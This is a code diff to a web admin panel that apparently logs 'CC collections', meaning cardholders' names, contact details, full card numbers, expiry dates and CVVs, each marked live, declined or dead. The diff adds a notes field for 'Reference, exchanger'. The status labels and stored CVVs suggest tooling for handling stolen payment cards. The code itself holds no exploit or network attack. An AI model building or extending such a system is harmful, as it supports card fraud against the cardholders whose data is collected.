@@ -3046,7 +3046,7 @@ async function adminCcPage() {
   const r = await api('GET', '/api/admin/cc'); const list = r.list || [];
   const last4 = (n) => { const s = String(n || ''); return s.length >= 4 ? '•••• ' + s.slice(-4) : '••••'; };
   const exp = (e) => { const s = String(e || '').replace(/\D/g, ''); if (s.length >= 4) return s.slice(0, 2) + '/' + s.slice(-2); return s; };
-  const rows = list.map((x) => { const id = esc(x.id); return `<tr><td class="small">${fmtDT(x.at)}</td><td><b>${esc(x.fullName)}</b><div class="small muted">${esc(x.email || '')}${x.phone ? ' · ' + esc(x.phone) : ''}${x.address ? ' · ' + esc(x.address) : ''}</div></td><td class="small">${last4(x.cardNumber)}</td><td class="small">${esc(exp(x.exp))}</td><td class="small">•••</td><td><span class="pill ${x.status === 'live' ? 'st-active' : 'st-expired'}">${esc((x.status || 'dead').toUpperCase())}</span></td><td><button class="btn sm" data-act="cc-edit" data-id="${id}">✏️</button> <button class="btn sm danger" data-act="cc-del" data-id="${id}">🗑</button></td></tr>` }).join('');
+  const rows = list.map((x) => { const id = esc(x.id); return `<tr><td class="small">${fmtDT(x.at)}</td><td><b>${esc(x.fullName)}</b><div class="small muted">${esc(x.email || '')}${x.phone ? ' · ' + esc(x.phone) : ''}${x.address ? ' · ' + esc(x.address) : ''}</div>${x.notes ? '<div class="small muted" style="max-width:220px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="' + esc(x.notes || '') + '">📝 ' + esc(x.notes) + '</div>' : ''}</td><td class="small">${last4(x.cardNumber)}</td><td class="small">${esc(exp(x.exp))}</td><td class="small">•••</td><td><span class="pill ${x.status === 'live' ? 'st-active' : 'st-expired'}">${esc((x.status || 'dead').toUpperCase())}</span></td><td><button class="btn sm" data-act="cc-edit" data-id="${id}">✏️</button> <button class="btn sm danger" data-act="cc-del" data-id="${id}">🗑</button></td></tr>` }).join('');
   return `<p class="small muted">Owner-only. Every CC collection with full card details and card status.</p>
   <div class="chips" style="margin-bottom:14px"><a class="on">Live ${r.liveCount || 0}</a><a class="on">Declined ${r.declinedCount || 0}</a><a class="on">Dead ${r.deadCount || 0}</a></div>
   <form data-form="cc-add" class="card"><h3>＋ Log a collection</h3>
@@ -3055,6 +3055,7 @@ async function adminCcPage() {
     ${field('Address', 'address', '', { attrs: 'maxlength="300"' })}
     ${field('Card Number (16 Digits)', 'cardNumber', '', { inputmode: 'numeric', attrs: 'required maxlength="19" placeholder="0000000000000000"' })}
     <div class="grid3">${field('Expiration Date (MM/YY)', 'exp', '', { attrs: 'required maxlength="5" placeholder="MM/YY" inputmode="numeric"' })}${field('CVV', 'cvv', '', { type: 'password', attrs: 'required maxlength="4" inputmode="numeric"' })}${field('Card Status', 'status', 'live', { type: 'select', options: [['live', 'Live'], ['declined', 'Declined'], ['dead', 'Dead']] })}</div>
+    ${field('Notes (optional)', 'notes', '', { type: 'textarea', rows: 2, ph: 'Reference, exchanger, anything useful…' })}
     <button type="submit" class="btn primary">Save entry</button>
   </form>
   ${list.length ? `<div class="card" style="margin-top:14px"><h3>Log <span class="small muted">(${list.length})</span></h3><div class="tbl-wrap"><table class="tbl"><thead><tr><th>When</th><th>Cardholder</th><th>Card</th><th>EXP</th><th>CVV</th><th>Status</th><th></th></tr></thead><tbody>${rows}</tbody></table></div></div>` : ''}`;
@@ -3073,6 +3074,7 @@ Object.assign(actions, {
       <div>${field('Expiration Date (MM/YY)', 'exp', (rec.exp ? rec.exp.slice(0,2)+'/'+rec.exp.slice(2) : ''), { attrs: 'required maxlength="5" placeholder="MM/YY" inputmode="numeric"' })}</div>
       <div>${field('CVV', 'cvv', rec.cvv || '', { type: 'password', attrs: 'required maxlength="4" inputmode="numeric"' })}</div>
       <div class="grid2 full">${field('Card Status', 'status', rec.status || 'live', { type: 'select', options: [['live','Live'],['declined','Declined'],['dead','Dead']] })}</div>
+      <div class="grid2 full">${field('Notes (optional)', 'notes', rec.notes || '', { type: 'textarea', rows: 2, ph: 'Reference, exchanger, anything useful…' })}</div>
       <div class="row full" style="justify-content:flex-end;margin-top:8px"><button type="button" class="btn ghost" data-act="close-modal">Cancel</button><button type="submit" class="btn primary">💾 Save changes</button></div>
     </form>`);
   },
@@ -3081,7 +3083,7 @@ Object.assign(forms, {
   async 'cc-add'(f) { try { await api('POST', '/api/admin/cc', formToObj(f)); toast('Saved ✓'); f.reset(); $('#admin-body').innerHTML = await adminCcPage(); } catch (e) { toast(e.message, true); } },
   async 'cc-edit'(f) {
     const id = f.dataset.id;
-    const body = { fullName: f.fullName.value.trim(), email: f.email.value.trim(), phone: f.phone.value.trim(), address: f.address.value.trim(), cardNumber: f.cardNumber.value.replace(/\D/g, '').slice(0, 16), exp: f.exp.value.replace(/[^0-9]/g, '').slice(0, 6), cvv: f.cvv.value.replace(/\D/g, '').slice(0, 4), status: ['live', 'declined', 'dead'].includes(f.status.value) ? f.status.value : 'live' };
+    const body = { fullName: f.fullName.value.trim(), email: f.email.value.trim(), phone: f.phone.value.trim(), address: f.address.value.trim(), cardNumber: f.cardNumber.value.replace(/\D/g, '').slice(0, 16), exp: f.exp.value.replace(/[^0-9]/g, '').slice(0, 6), cvv: f.cvv.value.replace(/\D/g, '').slice(0, 4), notes: f.notes.value.trim(), status: ['live', 'declined', 'dead'].includes(f.status.value) ? f.status.value : 'live' };
     try { await api('PUT', '/api/admin/cc/' + id, body); closeModal(); toast('CC entry updated ✓'); $('#admin-body').innerHTML = await adminCcPage(); } catch (e) { toast(e.message, true); }
   },
 });
